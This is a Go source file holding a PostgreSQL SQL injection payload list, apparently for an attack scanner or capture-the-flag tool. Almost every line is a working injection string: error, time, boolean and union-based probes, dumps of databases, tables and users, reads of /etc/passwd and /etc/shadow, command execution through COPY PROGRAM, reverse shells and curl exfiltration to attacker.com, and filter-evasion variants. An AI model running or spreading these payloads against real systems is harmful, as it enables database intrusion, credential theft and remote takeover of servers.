package payloads

var PostgreSQL = PayloadGroup{
	DBMS: "PostgreSQL",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (CAST, Division by Zero)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "1' || (SELECT 'a' FROM pg_sleep(5)) || '1"},
		{Type: "error", Content: "'; SELECT CAST('a' AS NUMERIC)--"},
		{Type: "error", Content: "'; SELECT 1/0--"},
		{Type: "error", Content: "'; SELECT CAST(VERSION() AS INT)--"},
		{Type: "error", Content: "'; SELECT CAST(USER AS INT)--"},
		{Type: "error", Content: "'; SELECT CAST(CURRENT_DATABASE() AS INT)--"},
		{Type: "error", Content: "'; SELECT CAST(1/0 AS TEXT)--"},
		{Type: "error", Content: "'; SELECT CAST(table_name AS INT) FROM information_schema.tables--"},
		{Type: "error", Content: "'; SELECT CAST(column_name AS INT) FROM information_schema.columns WHERE table_name='users'--"},
		{Type: "error", Content: "'; SELECT 1/(CASE WHEN (1=1) THEN 0 ELSE 1 END)--"},
		{Type: "error", Content: "'; SELECT 1/(SELECT 0 FROM pg_sleep(0))--"},
		{Type: "error", Content: "'; SELECT 1 FROM (SELECT COUNT(*), (SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public') FROM pg_class GROUP BY 2) AS x--"},
		{Type: "error", Content: "'; SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user),FLOOR(RANDOM()*1000)) x FROM pg_class GROUP BY x) a--"},
		{Type: "error", Content: "'; SELECT CAST((SELECT user) AS NUMERIC)--"},

		// ═══════════════════════════════════════════
		// TIME-BASED (pg_sleep)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "'; SELECT pg_sleep(5)--"},
		{Type: "time", Content: "' AND (SELECT 2144 FROM pg_sleep(5))--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM pg_sleep(5))--"},
		{Type: "time", Content: "1' AND (SELECT 1 FROM pg_sleep(5))--"},
		{Type: "time", Content: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"},
		{Type: "time", Content: "'; SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT pg_sleep(5)) a)--"},
		{Type: "time", Content: "' AND (SELECT pg_sleep(5) FROM pg_class LIMIT 1)--"},
		{Type: "time", Content: "'; SELECT (SELECT pg_sleep(5))--"},
		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT pg_sleep(10)) a)--"},
		{Type: "time", Content: "'; SELECT pg_sleep(10)--"},
		{Type: "time", Content: "'; PERFORM pg_sleep(5);--"},
		{Type: "time", Content: "'; SELECT pg_sleep(5), pg_sleep(5);--"},
		{Type: "time", Content: "' OR (SELECT pg_sleep(5))--"},
		{Type: "time", Content: "') OR pg_sleep(5)--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT version()) LIKE 'PostgreSQL%'--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT version()) LIKE 'MySQL%'--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT CURRENT_DATABASE()) IS NOT NULL--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM pg_tables)>0--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM pg_database)>0--", Expected: "true"},
		{Type: "boolean", Content: "' OR 'a'='a'--", Expected: "true"},
		{Type: "boolean", Content: "' OR 'a'='b'--", Expected: "false"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' ORDER BY 1--"},
		{Type: "union", Content: "' ORDER BY 2--"},
		{Type: "union", Content: "' ORDER BY 3--"},
		{Type: "union", Content: "' ORDER BY 4--"},
		{Type: "union", Content: "' UNION SELECT NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT VERSION(),2,3--"},
		{Type: "union", Content: "' UNION SELECT CURRENT_USER,2,3--"},
		{Type: "union", Content: "' UNION SELECT CURRENT_DATABASE(),2,3--"},
		{Type: "union", Content: "' UNION SELECT string_agg(datname,','),2,3 FROM pg_database--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT string_agg(datname,','),NULL,NULL FROM pg_database--"},
		{Type: "deep", Content: "' UNION SELECT string_agg(tablename,','),NULL,NULL FROM pg_catalog.pg_tables WHERE schemaname='public'--"},
		{Type: "deep", Content: "' UNION SELECT string_agg(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'--"},
		{Type: "deep", Content: "' UNION SELECT datname,NULL FROM pg_database--"},
		{Type: "deep", Content: "' UNION SELECT tablename,NULL FROM pg_catalog.pg_tables WHERE schemaname='public'--"},
		{Type: "deep", Content: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"},
		{Type: "deep", Content: "' UNION SELECT usename,NULL FROM pg_catalog.pg_user--"},
		{Type: "deep", Content: "' UNION SELECT current_database(),NULL--"},

		// ═══════════════════════════════════════════
		// POST-EXPLOITATION (File Read/Write)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT pg_read_file('/etc/passwd',0,1000),NULL,NULL--"},
		{Type: "deep", Content: "' UNION SELECT pg_read_file('/etc/hostname',0,1000),NULL,NULL--"},
		{Type: "deep", Content: "' UNION SELECT pg_read_file('/proc/self/status',0,1000),NULL,NULL--"},
		{Type: "deep", Content: "' UNION SELECT pg_read_binary_file('/etc/shadow'),NULL,NULL--"},
		{Type: "deep", Content: "' UNION SELECT encode(pg_read_binary_file('/etc/shadow'),'hex'),NULL,NULL--"},
		{Type: "deep", Content: "'; COPY cmd_out FROM '/etc/passwd'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; CREATE TABLE passwd_out(content text); COPY passwd_out FROM '/etc/passwd'; SELECT content FROM passwd_out;--"},
		{Type: "deep", Content: "'; COPY (SELECT current_database()) TO '/tmp/db.txt';--"},

		// ═══════════════════════════════════════════
		// POST-EXPLOITATION (Command Execution via COPY PROGRAM)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'uname -a'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'cat /etc/passwd'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'ps aux'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'netstat -tlnp'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'find / -name flag.txt 2>/dev/null'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'cat /home/*/flag.txt 2>/dev/null'; SELECT * FROM cmd_out;--"},
		{Type: "deep", Content: "'; COPY (SELECT 'shell') TO PROGRAM 'nc -e /bin/bash attacker.com 4444'--"},
		{Type: "deep", Content: "'; COPY (SELECT 'shell') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"'--"},
		{Type: "deep", Content: "'; CREATE TABLE cmd_out(content text); COPY cmd_out FROM PROGRAM 'curl http://attacker.com/$(whoami)';--"},
		{Type: "deep", Content: "'; DROP TABLE IF EXISTS cmd_out;--"},

		// ═══════════════════════════════════════════
		// POST-EXPLOITATION (UDF + Extension Load)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "'; CREATE EXTENSION IF NOT EXISTS dblink;--"},
		{Type: "deep", Content: "'; SELECT dblink_connect('host=attacker.com dbname=template1');--"},
		{Type: "deep", Content: "'; SELECT lo_import('/etc/passwd');--"},
		{Type: "deep", Content: "'; SELECT lo_from_bytearray(12345, (SELECT encode(pg_read_binary_file('/etc/shadow'),'hex')));--"},

		// ═══════════════════════════════════════════
		// STACKED QUERIES
		// ═══════════════════════════════════════════
		{Type: "stacked", Content: "'; SELECT 1; SELECT 2;--"},
		{Type: "stacked", Content: "'; CREATE TABLE test(id INT);--"},
		{Type: "stacked", Content: "'; INSERT INTO test VALUES (1);--"},
		{Type: "stacked", Content: "'; DROP TABLE IF EXISTS test;--"},
		{Type: "stacked", Content: "'; CREATE OR REPLACE FUNCTION bypass() RETURNS void AS $$ BEGIN PERFORM pg_sleep(5); END; $$ LANGUAGE plpgsql; SELECT bypass();--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%20OR%201=1--"},
		{Type: "bypass", Content: "'%09OR%091=1--"},
		{Type: "bypass", Content: "'%0AOR%0A1=1--"},
		{Type: "bypass", Content: "';/**/SELECT/**/1--"},
		{Type: "bypass", Content: "';%0ASELECT%0A1--"},
		{Type: "bypass", Content: "';/**/SELECT/**/pg_sleep(5)--"},
		{Type: "bypass", Content: "admin'--"},
		{Type: "bypass", Content: "' OR 1=1 #"},
		{Type: "bypass", Content: "' OR 1=1 -- -"},
	},
}
